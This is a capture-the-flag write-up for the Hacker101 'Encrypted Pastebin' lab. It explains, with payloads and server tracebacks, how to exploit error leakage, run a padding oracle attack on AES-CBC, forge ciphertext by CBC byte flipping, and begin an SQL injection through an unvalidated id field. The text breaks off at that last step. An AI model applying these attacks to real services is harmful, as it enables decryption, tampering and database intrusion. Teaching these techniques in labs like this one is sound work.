# Encrypted Pastebin

The website seems to work as follows:
1. It takes a title and some text
1. Makes a POST request to itself `http://__IP__/__ROOM__/` with `title=__title__&body=__body__` in the request body
1. The server encrypts the data
1. The server responds with a 302 response (redirect)
1. The client is redirected and makes a GET request with the link from the `Location` response header
`http://__IP__/__ROOM__/?post=__payload__`
1. The server receives the payload, decrypts it and returns an html document if it was decrypted successfully.

Example of a payload: `CVvRvrrD8O-kDeVBHh8-7aX56YGWh59sDqMY8TnNL3xHdNEvaXmFdqqI3aS6iVCUjxEHiq!EYogF0moI2V1Pdare4OzG56pftL!PzaWEMtEID2NhbnSAqs7dUQ5-giVPNh3wYYm1WQZbje!cdPtGV!kzoxPjJMwJayhu1PSHqAdu3P21YiNNWNlk94kPwrn0Jn5NlaqrKOXx9plp8FjSuw~~`

The GET request with the above string as `__payload__` responds with:
```HTML
<!doctype html>
<html>
	<head>
		<title>Test -- Encrypted Pastebin</title>
	</head>
	<body>
		<h1>Test</h1>
		<pre>
test
		</pre>
		<img src="tracking.gif">
	</body>
</html>
```

---

## Flag 0 - Improper Error Handling

### Accessing the situation:

When the server is hit with an invalid request it doesn't properly handle the exceptions raised.

### Execution:

Make a request with no `?post=` data like so:
```
http:// {IP} / {ROOM} /?post=
```
The backend spits out an error but first it shows the flag

---

## Flag 1 - Padding Oracle Attack

### Useful Info 1:
[How PadBuster works](https://blog.gdssecurity.com/labs/2010/9/14/automated-padding-oracle-attacks-with-padbuster.html)

[Writeup on this flag](https://sec.wonderingraven.net/hacker-ctf/write-up-hacker101-encrypted-pastebin/)

[Example solution](https://github.com/richardevcom/padding-oracle-attack)

[Extremely useful writeup in chinese](https://xz.aliyun.com/t/7054)

### Accessing the situation 1:

Making a request `http://__IP__/__ROOM__/?post=` gives this error:
```
Traceback (most recent call last):
  File "./main.py", line 69, in index
    post = json.loads(decryptLink(postCt).decode('utf8'))
  File "./common.py", line 48, in decryptLink
    cipher = AES.new(staticKey, AES.MODE_CBC, iv)
  File "/usr/local/lib/python2.7/site-packages/Crypto/Cipher/AES.py", line 95, in new
    return AESCipher(key, *args, **kwargs)
  File "/usr/local/lib/python2.7/site-packages/Crypto/Cipher/AES.py", line 59, in __init__
    blockalgo.BlockAlgo.__init__(self, _AES, key, *args, **kwargs)
  File "/usr/local/lib/python2.7/site-packages/Crypto/Cipher/blockalgo.py", line 141, in __init__
    self._cipher = factory.new(key, *args, **kwargs)
ValueError: IV must be 16 bytes long
```
**Conclusions**:
* The initializing vector is 16 bytes long
* The encryption is AES CBC with a static key


But `http://__IP__/__ROOM__/?post=1` gives:

```
Traceback (most recent call last):
  File "./main.py", line 69, in index
    post = json.loads(decryptLink(postCt).decode('utf8'))
  File "./common.py", line 46, in decryptLink
    data = b64d(data)
  File "./common.py", line 11, in <lambda>
    b64d = lambda x: base64.decodestring(x.replace('~', '=').replace('!', '/').replace('-', '+'))
  File "/usr/local/lib/python2.7/base64.py", line 328, in decodestring
    return binascii.a2b_base64(s)
Error: Incorrect padding
```
**Conclusions**:
* `[...] lambda x: base64.decodestring [...]` The string is encoded in base64 from UTF-8
* Some replacements take place before the string is decoded

Lastly, `http://__IP__/__ROOM__/?post=16161616161616161616161616161616'` gives:
```
Traceback (most recent call last):
  File "./main.py", line 69, in index
    post = json.loads(decryptLink(postCt).decode(\'utf8\'))
  File "./common.py", line 49, in decryptLink
    return unpad(cipher.decrypt(data))
  File "/usr/local/lib/python2.7/site-packages/Crypto/Cipher/blockalgo.py", line 295, in decrypt
    return self._cipher.decrypt(ciphertext)
ValueError: Input strings must be a multiple of 16 in length
              
```
**Conclusions**:
* Each block is 16 bytes in length


Using this `b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'` as payload gives:
```
Traceback (most recent call last):
  File "./main.py", line 69, in index
    post = json.loads(decryptLink(postCt).decode('utf8'))
  File "./common.py", line 49, in decryptLink
    return unpad(cipher.decrypt(data))
  File "./common.py", line 22, in unpad
    raise PaddingException()
PaddingException
```
**Conclusions**:
* The payload has led to invalid padding. This signals that the payload is of correct length but when being XORed it raised a padding error. This should be the most common error when a successful attack is being executed

Using this `AAAAAAAAAAAAAAAAAAAAAA~~` as payload:
```
Traceback (most recent call last):
  File "./main.py", line 69, in index
    post = json.loads(decryptLink(postCt).decode(utf8))
  File "./common.py", line 49, in decryptLink
    return unpad(cipher.decrypt(data))
  File "./common.py", line 19, in unpad
    padding = data[-1]
IndexError: string index out of range
```
**Conclusions**:
* This is one of the errors that the padding was correct and the server attempted to decipher the message. No data block was attached to the payload, so the server had nothing to decipher.

Using this `AAAAAAAAAAAAAAAAAAAAADbjZUA89fHn3Q5OfxFJteUyBWk8PVGXdZnPdkWgEKWq-37h78BxQEM57uhy74ATSJgnFrH05xRnDwYcd3eNKm4MmjSDxQ8WnclBYlUkaKrbwF3DyKAoFmZ3k9WTWSzd8Ujt!WJ-xj6ZtRHb87jEOgZWLCw1AhdudKGm9IbeLLMfzxawrmuikHHjTNv!CTki!w~~` as payload (our IV and some demo data):
```
Traceback (most recent call last):
  File "./main.py", line 69, in index
    post = json.loads(decryptLink(postCt).decode('utf8'))
  File "/usr/local/lib/python2.7/encodings/utf_8.py", line 16, in decode
    return codecs.utf_8_decode(input, errors, True)
UnicodeDecodeError: 'utf8' codec can't decode byte 0xb7 in position 0: invalid start byte
```
**Conclusions**:
* This is one of the errors that the padding was correct, and the server encountered an error while decoding the deciphered data.


### Execution 1:

Pressing the `post` button with no text or title makes a request with this as `__payload__`:

`zDwjyajP0AQGO0UaTlkk9jbjZUA89fHn3Q5OfxFJteUyBWk8PVGXdZnPdkWgEKWq-37h78BxQEM57uhy74ATSJgnFrH05xRnDwYcd3eNKm4MmjSDxQ8WnclBYlUkaKrbwF3DyKAoFmZ3k9WTWSzd8Ujt!WJ-xj6ZtRHb87jEOgZWLCw1AhdudKGm9IbeLLMfzxawrmuikHHjTNv!CTki!w~~`

Some replacements need to be made by the server ` [...] x.replace('~', '=').replace('!', '/').replace('-', '+') [...]` (as seen from the above errors) which result in:

`zDwjyajP0AQGO0UaTlkk9jbjZUA89fHn3Q5OfxFJteUyBWk8PVGXdZnPdkWgEKWq+37h78BxQEM57uhy74ATSJgnFrH05xRnDwYcd3eNKm4MmjSDxQ8WnclBYlUkaKrbwF3DyKAoFmZ3k9WTWSzd8Ujt/WJ+xj6ZtRHb87jEOgZWLCw1AhdudKGm9IbeLLMfzxawrmuikHHjTNv/CTki/w==`


This is then decoded from base64 into a string of bytes:

`b'\xcc<#\xc9\xa8\xcf\xd0\x04\x06;E\x1aNY$\xf66\xe3e@<\xf5\xf1\xe7\xdd\x0eN\x7f\x11I\xb5\xe52\x05i<=Q\x97u\x99\xcfvE\xa0\x10\xa5\xaa\xfb~\xe1\xef\xc0q@C9\xee\xe8r\xef\x80\x13H\x98\'\x16\xb1\xf4\xe7\x14g\x0f\x06\x1cww\x8d*n\x0c\x9a4\x83\xc5\x0f\x16\x9d\xc9AbU$h\xaa\xdb\xc0]\xc3\xc8\xa0(\x16fw\x93\xd5\x93Y,\xdd\xf1H\xed\xfdb~\xc6>\x99\xb5\x11\xdb\xf3\xb8\xc4:\x06V,,5\x02\x17nt\xa1\xa6\xf4\x86\xde,\xb3\x1f\xcf\x16\xb0\xaek\xa2\x90q\xe3L\xdb\xff\t9"\xff'`

which has a length of 160 bytes. We know (from the above errors) that the initializing vector and each block should be 16 bytes long. So the message consists of 10 16 byte long blocks.

Nearly every solution for this flag suggests to use [PadBuster](https://github.com/AonCyberLabs/PadBuster), but I am not a script kiddie. I will DIY this bitch.

Reading on how PadBuster works from the [Info](###-useful-info-1:) we can deduce that:
* The 1st block is the initialization vector
* The rest 9 blocks are the data that once decrypted should give us the message

We split these ten blocks in pairs of 2. The first pair is the original IV and the 1st data block. Then we will take the 1st data block and the 2nd data block, etc. We send two blocks at a time because the server may respond with unrelated errors when we send more.

For each pair we refer to its first block as the *IV* and the *data*. The *data* block is not important for the attack. It just feeds the server with some valid data. We only care about how the server handles the *IV*.

We start by saving the *IV*. We will use it later. Then we generate a new initialization vector -we will refer to it as *proposed_IV*- and put next to it the *data*. We have to apply some changes (replacements, utf8 encoding, etc.) that are specific to this flag before making any get request to the server.

We then attack as explained in the [How PadBuster works](https://blog.gdssecurity.com/labs/2010/9/14/automated-padding-oracle-attacks-with-padbuster.html) write up.

We care about only two responses. An error response about invalid padding and one about any internal server error. There are internal several errors regarding this flag. Not every single one should be considered as successful attempt in finding a byte. Their frequency should be compared.

After we find the correct *proposed_IV* and the original plaintext for that specific block of data we move on to the next pair {(original IV, 1st data block), (1st data block, 2nd data block), (2nd data block, 3rd data block), ...} and make the same attack.

The deciphering for each block is independent of one another. So I run the attack on multiple threads for each block, the server seemed to handle this just fine, and then combined their results.

When using multiple threads (tested on an i7-1165G7 with 8 threads) it took ~20 minutes, instead of ~128 minutes when testing one block after another. The time is cut significantly.

The deciphered payload should look something like this:
`b'{"flag": "^FLAG^****************************************************************$FLAG$", "id": "11", "key": "b8pxpJxttgLbgIGtUZ1MDg~~"}\n\n\n\n\n\n\n\n\n'`

---

## Flag 2 - CBC byte flipping attack

It is known that CBC encryption is vulnerable to the *byte flip attack*. This attack targets a single byte of the ciphertext and changes it to another one. This is usefull for sending custom valid encrypted payloads to a server when the encryption key is not known.

### Useful Info 2:
[Extremely useful writeup in chinese (again)](https://xz.aliyun.com/t/7054)

[CBC byte flipping 101](https://resources.infosecinstitute.com/topic/cbc-byte-flipping-attack-101-approach/)


### Accessing the situation 2:
Firstly, let's restart the challenge and get a new payload by posting a new "paste".

The payload we want to send looks something like this:

`EgXfVB4r2baM!BivkMadVdZ37FHHYeAzqx!6H0ehX413OJUuVWJu4MVhYMA0wr6bksBISFGyBYGqbDPitgQDzQaJyirYwHDIEFHBUA4KFJ!XT-MOXj6GOdgwPWUuqDqV6vBWYeRdrGVtuvoxowj8IwEWqZIs89WV7QgUD!TY0thvrwq40Te2tSoOGeZV7FmipI0KzizsAUK!3ZNimM5Upg~~`

And after the replacements and the decoding:
```b'\x12\x05\xdfT\x1e+\xd9\xb6\x8c\xfc\x18\xaf\x90\xc6\x9dU\xd6w\xecQ\xc7a\xe03\xab\x1f\xfa\x1fG\xa1_\x8dw8\x95.Ubn\xe0\xc5a`\xc04\xc2\xbe\x9b\x92\xc0HHQ\xb2\x05\x81\xaal3\xe2\xb6\x04\x03\xcd\x06\x89\xca*\xd8\xc0p\xc8\x10Q\xc1P\x0e\n\x14\x9f\xd7O\xe3\x0e^>\x869\xd80=e.\xa8:\x95\xea\xf0Va\xe4]\xacem\xba\xfa1\xa3\x08\xfc#\x01\x16\xa9\x92,\xf3\xd5\x95\xed\x08\x14\x0f\xf4\xd8\xd2\xd8o\xaf\n\xb8\xd17\xb6\xb5*\x0e\x19\xe6U\xecY\xa2\xa4\x8d\n\xce,\xec\x01B\xbf\xdd\x93b\x98\xceT\xa6'```

And after executing [the padding oracle attack](##-flag-1---padding-oracle-attack) looks something like this when decrypted:

*The IV*  + `{"flag": "^FLAG^****************************************************************$FLAG$", "id": "2", "key": "LZ0AWJzal8-klQaAJiMEZQ~~"}\n\n\n\n\n\n\n\n\n`

Although we have posted only one "paste" we can see that it has an id of *2*. What does id *1* have? Let's find out be performing a byte flip attack.

### Execution 2:

Below is a table that shows what each block of 16 bytes represents (`\n` counts as one character/byte).

| Block # | Plaintext | Payload (bytes) |
| --- | --- | ---|
| 0 | *The IV*                     | 12:05:df:54:1e:2b:d9:b6:8c:fc:18:af:90:c6:9d:55 |
| 1 | `{"flag": "^FLAG^`           | d6:77:ec:51:c7:61:e0:33:ab:1f:fa:1f:47:a1:5f:8d |
| 2 | `****************`           | 00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00 |
| 3 | `****************`           | 00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00 |
| 4 | `****************`           | 00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00 |
| 5 | `****************`           | 00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00 |
| 6 | `$FLAG$", "id": "`           | ea:f0:56:61:e4:5d:ac:65:6d:ba:fa:31:a3:08:fc:23 |
| 7 | `2", "key": "kKk5`           | 01:16:a9:92:2c:f3:d5:95:ed:08:14:0f:f4:d8:d2:d8 |
| 8 | `ckIzA7-hBjc8uGno`           | 6f:af:0a:b8:d1:37:b6:b5:2a:0e:19:e6:55:ec:59:a2 |
| 9 | `zg~~"}\n\n\n\n\n\n\n\n\n\n` | a4:8d:0a:ce:2c:ec:01:42:bf:dd:93:62:98:ce:54:a6 |

First let's try to change the byte that represents `2` to `1` in the 8th block.

To do that we should go to the previous block (7th) and change the value at the same index as the `2` in the 8th block, which is 0.

We XOR the byte of interest of the encrypted payload (after the replacements, etc.) of the 7th block with the value it actually has (`2`) and then with the value we want (`1`). Then we send the modified payload to the server.

The sever responds with:

```
UnicodeDecodeError: 'utf8' codec can't decode byte 0xc9 in position 83: invalid continuation byte
```

Which is the error *Werner*, writer of the chinese write up, warned us about. So we will have to slice the payload and remove the flag from it, just like he did.

We only keep the last 5 blocks (block #5 - #9). We have to keep block #5 because it is used as the IV for block #6 which is the block we are interested in.

So we have this payload:

| OLD Block # | NEW Block # | Plaintext | Payload (bytes) |
| --- | --- | ---| --- |
| 5 | 0 | `****************`           | 00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00 |
| 6 | 1 | `$FLAG$", "id": "`           | ea:f0:56:61:e4:5d:ac:65:6d:ba:fa:31:a3:08:fc:23 |
| 7 | 2 | `2", "key": "kKk5`           | 01:16:a9:92:2c:f3:d5:95:ed:08:14:0f:f4:d8:d2:d8 |
| 8 | 3 | `ckIzA7-hBjc8uGno`           | 6f:af:0a:b8:d1:37:b6:b5:2a:0e:19:e6:55:ec:59:a2 |
| 9 | 4 | `zg~~"}\n\n\n\n\n\n\n\n\n\n` | a4:8d:0a:ce:2c:ec:01:42:bf:dd:93:62:98:ce:54:a6 |

We have to modify the payload to make it a valid json file again and change the value of the *id* to `1`. Changing block #1 to `{"id":"1", "i":"` will achieve that.

The plaintext message we want the server to receive after its decryption is:

```json
{"id":"1", "i":"2", "key": "kKk5ckIzA7-hBjc8uGnozg~~"}\n\n\n\n\n\n\n\n\n\n
```

This will produce errors (eg. there is no `flag` or `i` variable in a valid payload) but thankfully the error we want will be caused sooner than the rest!

Simply bitflipping block #1 won't produce the appropriate payload. The last step of the decryption process is to XOR the freshly decrypted block with the ciphertext of the previous block or, for the 1st block, with the IV. So we want to modify the IV of the new payload so that after the XORing it produces the payload we want.

Firstly, we XOR block #0 (IV) with the value of block #1 (`$FLAG$", "id": "`). Then with the value we want it to have (`{"id":"1", "i":"`). The final step is to send the new payload to the server.

The response is:

```
Attempting to decrypt page with title: ^FLAG^****************************************************************$FLAG$
Traceback (most recent call last):
  File "./main.py", line 74, in index
    body = decryptPayload(post['key'], body)
  File "./common.py", line 37, in decryptPayload
    return unpad(cipher.decrypt(data))
  File "./common.py", line 22, in unpad
    raise PaddingException()
PaddingException

```

Which contains flag #2


### Notes:
* The hacker101 ctf has been updated since the previous commit. The new backend seems to throttle my requests, which becomes especially annoying when executing a padding oracle attack... Instead of 20 minutes it takes 90 (when using threads)...
* *Werner* has a small, not critical to the execution, typo in how he describes the blocks. Each block must be 16 bytes long. He counts the character `\n` as two characters/bytes.

---

## Flag 2 - ~~Mystery~~ SQL Injection

### Useful Info 3:

The hint for this flag is hilarious!

### Accessing the situation 3:

From the previous flag we see that we can ask the server for any page. If the page we are trying to find doesn't exist then it shows `Attempting to decrypt page with title: [...]`. Let's try to send an invalid id and see what happens.


We modify the previous code for the byte flipping so that we can send any character to the server. Let's try sending the character `a`. The payload should look something like this:

```json
{"id":"a", "i":"2", "key": "kKk5ckIzA7-hBjc8uGnozg~~"}\n\n\n\n\n\n\n\n\n\n
```

The server responds with:

```
Traceback (most recent call last):
  File "./main.py", line 71, in index
    if cur.execute('SELECT title, body FROM posts WHERE id=%s' % post['id']) == 0:
  File "/usr/local/lib/python2.7/site-packages/MySQLdb/cursors.py", line 255, in execute
    self.errorhandler(self, exc, value)
  File "/usr/local/lib/python2.7/site-packages/MySQLdb/connections.py", line 50, in defaulterrorhandler
    raise errorvalue
OperationalError: (1054, "Unknown column 'a' in 'where clause'")
```

Bingo! The SQL is not validated before it is being sent to the database. This means that we can execute an SQL Injection.


### Execution 3:

The SQL is quite simple:
```SQL
SELECT title, body FROM posts WHERE id = __id__
```

We can't change more than one character of the payload... YET!
